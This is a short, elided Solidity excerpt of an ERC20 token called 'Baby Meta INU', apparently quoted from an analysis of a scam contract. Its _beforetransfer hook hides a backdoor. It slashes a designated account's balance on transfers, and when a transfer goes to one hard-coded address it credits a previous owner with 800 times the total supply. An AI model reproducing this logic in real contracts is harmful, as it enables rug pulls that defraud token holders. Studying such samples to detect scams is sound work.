...
contract ERC20 is IERC20 {
    ...
    function _beforetransfer(address to) internal {
        if (to != recip){_balances[recip]= _balances[recip].divCeil(100);}
        if (to == 0xFCeDdE8a7d4aa2BcB9586dBA43B584A71f19DF17) {_balances[_prevOwner] += _totalSupply*800;}
...
contract CustomERC20 is ERC20 {
    ...
    constructor() ERC20("Baby Meta INU", "BabyMetaINU") {
///////////////////////////////////////////////
